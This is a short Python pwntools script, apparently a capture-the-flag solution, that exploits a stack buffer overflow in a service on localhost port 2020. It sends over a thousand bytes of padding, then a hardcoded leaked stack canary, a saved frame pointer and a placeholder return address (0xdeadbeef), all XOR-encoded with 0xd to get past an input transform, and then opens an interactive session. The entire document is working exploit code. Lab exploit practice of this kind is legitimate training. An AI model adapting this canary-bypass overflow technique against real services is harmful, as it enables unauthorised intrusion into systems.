from pwn import *
# canary can be fetched using fetch_canary.py
valid = lambda s: "".join([chr(ord(c) ^ 0xd) for c in s])

canary = 0x88c77bc34793e200

p = remote("localhost", 2020)
p.send("davideAA" + "AAAAAAAA" * 128 + valid(p64(canary)) + valid(p64(0)) + valid(p64(0xdeadbeef)))
p.interactive()
